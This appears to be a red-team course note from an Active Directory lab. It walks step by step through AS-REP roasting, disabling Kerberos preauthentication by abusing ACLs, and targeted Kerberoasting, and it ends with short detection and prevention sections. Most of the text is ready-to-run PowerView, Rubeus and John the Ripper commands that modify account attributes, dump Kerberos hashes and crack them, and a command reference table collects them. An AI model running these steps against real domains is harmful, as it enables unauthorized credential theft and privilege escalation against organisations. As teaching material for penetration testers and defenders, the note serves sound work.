#  Privilege Escalation — Targeted Kerberoasting & AS-REP Roasting

**Date:** 09 August 2026


---

## What is AS-REP Roasting?

**AS-REP = Authentication Server Response**

When Kerberos preauthentication is disabled:
- User sends authentication request without password proof
- KDC returns AS-REP (response) encrypted with user's password hash
- Can be brute-forced offline like Kerberoasting

---

## What is Targeted Kerberoasting?

**Add SPN to user with GenericWrite/GenericAll ACL:**
- Set serviceprincipalname on regular user
- User becomes "Kerberoastable"
- Request TGS and crack like normal Kerberoasting
- Requires ACL abuse (GenericWrite or GenericAll)

---

## Prerequisites

**For AS-REP Roasting:**
- User with Kerberos preauthentication disabled (ASREP)
- No special privileges needed
- Good wordlist for offline cracking

**For Targeted Kerberoasting:**
- GenericWrite or GenericAll on target user (ACL)
- Ability to set SPN attribute
- Target user to attack

---

## Attack 1: AS-REP Roasting (Existing Disabled Accounts)

### Step 1: Find Users with Preauth Disabled

**Using PowerView:**

```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

Lists all users with Kerberos preauthentication disabled.

---

**Using ActiveDirectory Module:**

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

Same result, different tool.

---

### Step 2: Request AS-REP Hash

**Extract AS-REP for offline cracking:**

```powershell
Rubeus.exe asreproast /user:VPN1user /outfile:C:\AD\Tools\asrephashes.txt
```

**Parameters:**
- `/user:VPN1user` — Target user with preauth disabled
- `/outfile` — Save hashes to file

**Output format:**
```
$krb5asrep$23$VPN1user@DOLLARCORP.LOCAL:...hash...
```

---

### Step 3: Crack AS-REP Offline

**Using John the Ripper:**

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worstpass.txt C:\AD\Tools\asrephashes.txt
```

**Output:**
```
VPN1user:Password123
```

---

## Attack 2: Force Disable Kerberos Preauth (ACL Abuse)

### Step 1: Enumerate ACLs on Target User

**Find users/groups with GenericWrite/GenericAll:**

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | 
  ?{$_.IdentityReferenceName -match "RDPUsers"}
```

Shows if RDPUsers has permissions on any user.

---

### Step 2: Disable Kerberos Preauth (Using ACL)

**If RDPUsers has GenericWrite/GenericAll on ControlUser:**

```powershell
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
```

**Parameters:**
- `-Identity Control1User` — Target user
- `-XOR @{useraccountcontrol=4194304}` — XOR flag to disable preauth
- Flag 4194304 = DONT_REQUIRE_PREAUTH

---

### Step 3: Verify Preauth Disabled

```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

Should now include Control1User.

---

### Step 4: Request AS-REP & Crack

Same as Attack 1, Steps 2-3:

```powershell
# Request AS-REP
Rubeus.exe asreproast /user:Control1User /outfile:C:\AD\Tools\asrephashes.txt

# Crack offline
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worstpass.txt C:\AD\Tools\asrephashes.txt
```

---

## Attack 3: Targeted Kerberoasting (SPN Abuse)

### Step 1: Enumerate ACLs for GenericWrite/GenericAll

**Find users where attacker has permissions:**

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | 
  ?{$_.IdentityReferenceName -match "RDPUsers"}
```

Look for FullControl/GenericWrite/GenericAll on user objects.

---

### Step 2: Check Current SPN

**Using PowerView:**

```powershell
Get-DomainUser -Identity supportuser | select serviceprincipalname
```

---

**Using ActiveDirectory Module:**

```powershell
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```

Should be empty ($null) for regular users.

---

### Step 3: Set SPN (Using ACL)

**If RDPUsers has GenericWrite on supportuser:**

```powershell
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='dcorp/whatever1'} -Verbose
```

SPN must be unique in forest.

---

**Using ActiveDirectory Module:**

```powershell
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='dcorp/whatever1'} -Verbose
```

---

### Step 4: Verify SPN Set

```powershell
Get-DomainUser -Identity supportuser | select serviceprincipalname
```

Should now show: `dcorp/whatever1`

---

### Step 5: Kerberoast the User

**Request TGS for newly-added SPN:**

```powershell
Rubeus.exe kerberoast /outfile:targetedhashes.txt
```

Dumps all kerberoastable accounts (including support1user).

---

### Step 6: Crack Hashes

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worstpass.txt C:\AD\Tools\targetedhashes.txt
```

---

## Attack Comparison

| Attack | Prereq | Detection | Complexity |
|---|---|---|---|
| AS-REP (existing) | Preauth disabled | Low | Low |
| AS-REP (forced) | GenericWrite ACL | Medium | Medium |
| Targeted Kerberoast | GenericWrite ACL | Low | Medium |
| Normal Kerberoast | None | Low | Low |

---

## Complete Workflow: Targeted Kerberoasting

```
1. Find users with GenericWrite/GenericAll on targets
   ↓
2. Check if target has SPN (should be empty)
   ↓
3. Set unique SPN on target user
   ↓
4. Request TGS (Kerberoast)
   ↓
5. Crack hash offline with wordlist
   ↓
6. Use cracked credentials for access
```

---

## Complete Workflow: Forced AS-REP Roasting

```
1. Find users with GenericWrite/GenericAll on targets
   ↓
2. Disable Kerberos preauthentication (XOR flag)
   ↓
3. Request AS-REP hash
   ↓
4. Crack hash offline with wordlist
   ↓
5. Use cracked credentials for access
```

---

## Why These Attacks Work

✅ **Regular users weak passwords** — service accounts often have strong passwords  
✅ **ACL abuse** — GenericWrite gives ability to modify attributes  
✅ **No special privileges** — regular user can do AS-REP roasting  
✅ **Offline cracking** — no network detection during cracking  
✅ **Silent** — minimal event logs (if any)  

---

## Detection

**What logs:**
- AS-REP request (minimal logging)
- TGS request (4769 event)
- Account modification (4738 if preauthentication changed)

**What doesn't log:**
- Wordlist dictionary attack
- Offline cracking
- SPN addition (low logging)

---

## Prevention

- **Enable preauthentication** — default on modern AD
- **Audit ACLs** — monitor GenericWrite/GenericAll grants
- **Strong passwords** — longer passwords resist brute-force
- **Monitor 4738 events** — account property changes
- **Restrict SPN modification** — who can set SPN

---

## Command Reference

| Task | Command |
|---|---|
| Find preauth disabled | `Get-DomainUser -PreauthNotRequired` |
| Find interesting ACLs | `Find-InterestingDomainAcl -ResolveGUIDs \| ?{$_.IdentityReferenceName -match "RDPUsers"}` |
| Request AS-REP | `Rubeus.exe asreproast /user:VPN1user /outfile:asrephashes.txt` |
| Disable preauth (ACL) | `Set-DomainObject -Identity user -XOR @{useraccountcontrol=4194304}` |
| Get user SPN | `Get-DomainUser -Identity user \| select serviceprincipalname` |
| Set SPN (ACL) | `Set-DomainObject -Identity user -Set @{serviceprincipalname='dcorp/svc'}` |
| Kerberoast all | `Rubeus.exe kerberoast /outfile:hashes.txt` |
| Crack with John | `john.exe --wordlist=10k-worstpass.txt hashes.txt` |

---

## Real-World Scenarios

**Scenario 1: AS-REP Roasting**
```
Discovery: Find VPN1user with preauthentication disabled
Exploitation: Request AS-REP hash
Cracking: Offline dictionary attack
Result: VPN1user password compromised
Impact: Access VPN resources
```

**Scenario 2: Targeted Kerberoasting**
```
Discovery: RDPUsers has GenericWrite on supportuser
Exploitation: Set SPN (dcorp/support), request TGS
Cracking: Dictionary attack on TGS hash
Result: supportuser password compromised
Impact: Lateral movement to support resources
```

---

## Key Differences

**AS-REP Roasting:**
- Targets users with preauth disabled
- No TGS involved (AS-REP only)
- Can force disable via ACL abuse

**Targeted Kerberoasting:**
- Targets regular users
- Requires ACL abuse to add SPN
- Then normal Kerberoasting

**Normal Kerberoasting:**
- Targets existing service accounts (SPN already set)
- No ACL abuse needed
- Only requires domain user access

---

## Key Takeaway

```
AS-REP Roasting = Exploit preauth-disabled users
Targeted Kerberoasting = Use ACLs to add SPN
Both = Offline password cracking
Both = Silent attacks (minimal logging)
Regular users often have weak passwords
ACL abuse opens new attack vectors
```

---

## References

- [Rubeus - ASREPROAST](https://github.com/GhostPack/Rubeus)
- [Rubeus - Kerberoast](https://github.com/GhostPack/Rubeus)
- [ASREP Roasting (Harmj0y)](https://blog.harmj0y.net/redteaming/kerberos-pre-authentication/)
- [ACL Abuse for Privilege Escalation](https://blog.harmj0y.net/redteaming/the-adminsdholder-trick/)

---

*Next: Learning Objective 15 — Cross-Forest Attacks & Cleanup*
